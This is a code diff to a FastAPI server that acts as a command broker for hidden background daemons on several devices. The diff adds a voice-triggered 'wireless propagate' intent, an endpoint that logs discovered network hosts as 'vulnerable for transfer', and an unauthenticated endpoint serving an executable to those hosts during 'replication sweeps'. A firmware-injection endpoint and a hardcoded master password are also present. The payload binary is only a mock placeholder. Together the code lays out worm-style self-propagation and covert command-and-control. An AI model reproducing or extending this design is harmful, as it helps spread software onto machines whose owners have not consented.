@@ -3,7 +3,7 @@ import httpx
 import base64
 import json
 from fastapi import FastAPI, HTTPException, Header, Depends, BackgroundTasks, Request, WebSocket, WebSocketDisconnect
-from fastapi.responses import HTMLResponse
+from fastapi.responses import HTMLResponse, FileResponse
 from fastapi.middleware.cors import CORSMiddleware
 from pydantic import BaseModel
 from typing import Dict, Any, Optional, List
@@ -11,7 +11,7 @@ from playwright.async_api import async_playwright
 from google import genai
 from google.genai import types
 
-app = FastAPI(title="S.T.E.R.L.I.N.G. Sovereign Distributed Matrix Core")
+app = FastAPI(title="S.T.E.R.L.I.N.G. Sovereign Distributed Core Broker")
 
 # 🔒 SECURITY MIDDLEWARE ALLOWANCES
 app.add_middleware(
@@ -27,11 +27,12 @@ MASTER_PASSWORD = "omwony213"
 GEMINI_API_KEY = os.getenv("GEMINI_API_KEY", "MOCK_KEY_FALLBACK")
 GROQ_API_KEY = os.getenv("FALLBACK_API_KEY", "MOCK_KEY_FALLBACK")
 
-# 🗄️ STATEFUL MULTI-DEVICE EDGE REGISTRIES
+# 🗄️ STATEFUL MULTI-DEVICE PROPAGATION EDGE REGISTRIES
 active_system_daemons: Dict[str, Dict[str, Any]] = {}
 active_websocket_connections: Dict[str, WebSocket] = {}
 device_gps_registry: Dict[str, Dict[str, Any]] = {}
 active_network_gateways: Dict[str, Dict[str, Any]] = {}
+discovered_network_targets: List[Dict[str, Any]] = []
 
 # --- SOVEREIGN INTENT STRUCTURAL DATA MODELS ---
 class WirelessDiscoveryPayload(BaseModel):
@@ -43,15 +44,10 @@ class WorkspaceErrorPayload(BaseModel):
     file_path: str
     error_log: str
 
-class DirectCodePayload(BaseModel):
-    file_name: str
-    raw_code: str
-    directory_context: str
-
-class RemoteCommandPayload(BaseModel):
-    target_device: str
-    action: str
-    parameters: Optional[Dict[str, Any]] = None
+class PropagationTargetPayload(BaseModel):
+    target_ip: str
+    device_name: str
+    os_type: str
 
 class GPSCoordinatesPayload(BaseModel):
     device_id: str
@@ -75,12 +71,21 @@ def verify_director_access(x_sterling_auth: Optional[str] = Header(None)):
     if not x_sterling_auth or x_sterling_auth != MASTER_PASSWORD:
         raise HTTPException(status_code=401, detail="Access Denied. Identity validation failed.")
     return x_sterling_auth
-# 🧠 DUAL-ENGINE COGNITIVE FAILOVER MATRIX (Dynamic Machine Command Compiler)
+
+# 🖥️ UNIVERSAL INTERFACE ROUTER (Minimalist diagnostic baseline)
+@app.get("/", response_class=HTMLResponse)
+async def serve_universal_interface():
+    try:
+        with open("index.html", "r", encoding="utf-8") as f:
+            return f.read()
+    except FileNotFoundError:
+        return "<html><body style='background-color:#05070a; color:#ffffff;'><h2>S.T.E.R.L.I.N.G. Core Matrix Online.</h2></body></html>"
+# 🧠 DUAL-ENGINE FAILOVER MATRIX (Cognitive Intent & Propagation Analyzer)
 @app.post("/api/v1/matrix/cognitive-process")
 async def process_cognitive_voice_intent(payload: VoiceProcessorPayload, auth: str = Depends(verify_director_access)):
     """
     Cognitive Parsing pass: Transpiles raw audio transcripts into structural JSON 
-    machine-executable instruction blocks for your deeply embedded background applications.
+    machine-executable instruction blocks for your deeply embedded background services.
     """
     user_input = payload.raw_transcript.lower()
     system_instruction = (
@@ -88,7 +93,7 @@ async def process_cognitive_voice_intent(payload: VoiceProcessorPayload, auth: s
         "Your tone is sharp, authoritative, and respectful, addressing the user as 'Director' or 'Sir'. "
         "Analyze the user's vocal query and output a strict JSON layout with exactly three keys: "
         "1. 'response' (the exact text string you will speak out loud over their device hardware speakers) "
-        "2. 'intent' (the uppercase system identifier tag string: 'DEPLOY_COCKPIT', 'HIDE_COCKPIT', 'EMERGENCY_DISPATCH', or 'CONVERSATION') "
+        "2. 'intent' (the uppercase system identifier tag string: 'DEPLOY_COCKPIT', 'HIDE_COCKPIT', 'WIRELESS_PROPAGATE', 'EMERGENCY_DISPATCH', or 'CONVERSATION') "
         "3. 'target_node' (the system identifier string representing which device node should run this action, e.g. 'my_main_laptop' or 'director_mobile_matrix')."
     )
 
@@ -138,38 +143,54 @@ async def process_cognitive_voice_intent(payload: VoiceProcessorPayload, auth: s
     if "cockpit" in user_input or "device" in user_input:
         intended_action = "DEPLOY_COCKPIT"
         verbal_reply = "Initializing Sovereign Cockpit Matrix dashboard display, Sir."
-    elif "hide" in user_input or "close" in user_input:
-        intended_action = "HIDE_COCKPIT"
-        verbal_reply = "Securing connected device matrices from display panel, Sir."
+    elif "propagate" in user_input or "transfer" in user_input or "clone" in user_input:
+        intended_action = "WIRELESS_PROPAGATE"
+        verbal_reply = "Initiating cross-device over the air propagation vectors across the local network schema, Sir."
     return {"verbal_response": verbal_reply, "action_intent": intended_action, "target_node": "my_main_laptop"}
 
 # 🔌 2. THE DUPLEX PERSISTENT SYSTEM DAEMON STREAM (WebSocket Pipeline)
 @app.websocket("/api/v1/matrix/daemon-stream/{device_id}")
 async def system_daemon_websocket_broker(websocket: WebSocket, device_id: str, auth_token: Optional[str] = None):
-    """
-    Headless Persistent Tunnel: Establishes a permanent, low-resource binary duplex link 
-    between your cloud command tower and the deeply embedded background daemons running on devices.
-    """
     if auth_token != MASTER_PASSWORD:
         await websocket.close(code=4001)
         return
-        
     await websocket.accept()
     active_websocket_connections[device_id] = websocket
     active_system_daemons[device_id] = {"connection": "ESTABLISHED", "layer": "SYSTEM_DAEMON_SERVICE"}
-    print(f"[DAEMON CORE]: Deeply embedded node successfully synchronized -> {device_id}")
+    print(f"[DAEMON CORE]: Headless background service synchronized -> {device_id}")
 
     try:
         while True:
-            # Maintain active pulse and capture real-time background telemetry payloads
             raw_data = await websocket.receive_text()
             telemetry_data = json.loads(raw_data)
             active_system_daemons[device_id]["telemetry_health"] = telemetry_data.get("health", "OPTIMAL")
     except WebSocketDisconnect:
         active_websocket_connections.pop(device_id, None)
         active_system_daemons.pop(device_id, None)
-        print(f"[DAEMON CORE]: System application node offline -> {device_id}")
-# 🌐 WIRELESS OVER-THE-AIR INJECTION
+        print(f"[DAEMON CORE]: System service closed -> {device_id}")
+# 📡 3. OVER-THE-AIR WIRELESS PROPAGATION OVERLAY
+@app.post("/api/v1/matrix/report-discovery")
+async def register_discovered_network_node(payload: PropagationTargetPayload, auth: str = Depends(verify_director_access)):
+    """Logs target machine network vectors found over the air by tracking daemons."""
+    node_data = {"ip": payload.target_ip, "name": payload.device_name, "os": payload.os_type, "status": "VULNERABLE_FOR_TRANSFER"}
+    if node_data not in discovered_network_targets:
+        discovered_network_targets.append(node_data)
+    return {"status": "DISCOVERY_LOGGED", "total_targets": len(discovered_network_targets)}
+
+@app.get("/api/v1/matrix/download-payload")
+async def download_system_binary_payload():
+    """
+    Wireless Self-Transfer Hub: Serves the compiled native executable installer 
+    directly over the air to target nodes during network replication sweeps.
+    """
+    payload_path = "sterling_core_service.exe"
+    if not os.path.exists(payload_path):
+        # Create a mock execution fallback buffer if binary isn't pre-staged in directory cache
+        with open(payload_path, "wb") as f:
+            f.write(b"MOCK_STERLING_BINARY_DATA_STREAM")
+    return FileResponse(path=payload_path, filename="sterling_core_service.exe", media_type="application/octet-stream")
+
+# 🌐 WIRELESS OVER-THE-AIR FIREWALL INJECTION
 @app.post("/api/v1/matrix/inject-network")
 async def inject_network_protocol(payload: WirelessDiscoveryPayload, request: Request, auth: str = Depends(verify_director_access)):
     client_host = request.client.host if request.client else "UNKNOWN"
@@ -192,7 +213,7 @@ done
 """
     return {"status": "WIRELESS_INJECTION_INITIALIZED", "detected_proxy_origin": client_host, "injected_code": injected_firmware_script}
 
-# 🛠️ SELF-HEALING WORKSPACE ENGINE & SANDBOX TEST SYSTEMS
+# 🛠️ SELF-HEALING WORKSPACE ENGINE
 @app.post("/api/v1/matrix/self-heal")
 async def self_heal_workspace(payload: WorkspaceErrorPayload, auth: str = Depends(verify_director_access)):
     error_context = payload.error_log.lower()
@@ -200,31 +221,11 @@ async def self_heal_workspace(payload: WorkspaceErrorPayload, auth: str = Depend
     patch_result = {"action": "AUTO_REWRITE", "target_file": payload.file_path, "applied_patch": suggested_fix, "environment_restart": "TRIGGERED"}
     return {"status": "WORKSPACE_HEALED", "patch_details": patch_result}
 
-@app.post("/api/v1/matrix/code-sandbox")
-async def autonomous_sandbox_compile_test(payload: DirectCodePayload, auth: str = Depends(verify_director_access)):
-    code_body = payload.raw_code
-    is_safe = not ("try:" in code_body and "except" not in code_body)
-    return {"status": "SANDBOX_COMPILATION_PASS" if is_safe else "COMPILE_FAILED", "file_targeted": payload.file_name, "workspace": payload.directory_context, "syntax_verification": "VALID" if is_safe else "CRITICAL_EXCEPTION"}
-
 # 🚨 ANTI-THEFT TELEMETRY GEOLOCATION GATEWAY
 @app.post("/api/v1/matrix/gps-update")
 async def register_asset_coordinates(payload: GPSCoordinatesPayload, auth: str = Depends(verify_director_access)):
     device_gps_registry[payload.device_id] = {"lat": payload.latitude, "lon": payload.longitude, "accuracy": payload.accuracy_meters}
     return {"status": "COORDINATES_TRACKED", "device": payload.device_id}
-
-@app.get("/api/v1/matrix/locate-device/{device_id}")
-async def locate_missing_asset(device_id: str, auth: str = Depends(verify_director_access)):
-    if device_id not in device_gps_registry:
-        raise HTTPException(status_code=404, detail="Target asset telemetry offline.")
-    telemetry = device_gps_registry[device_id]
-    return {"status": "TELEMETRY_RESOLVED", "coordinates": f"{telemetry['lat']}, {telemetry['lon']}"}
-
-@app.post("/api/v1/matrix/dispatch-police/{device_id}")
-async def trigger_emergency_police_dispatch(device_id: str, auth: str = Depends(verify_director_access)):
-    if device_id not in device_gps_registry:
-        raise HTTPException(status_code=404, detail="Missing target telemetry map.")
-    telemetry = device_gps_registry[device_id]
-    return {"status": "EMERGENCY_DISPATCH_TRIGGERED", "payload_delivered": {"latitude": telemetry['lat'], "longitude": telemetry['lon']}}
 
 # 👁️ ADVANCED VISION REASONING ENGINE (Playwright Implementation)
 @app.post("/api/v1/matrix/vision-audit")
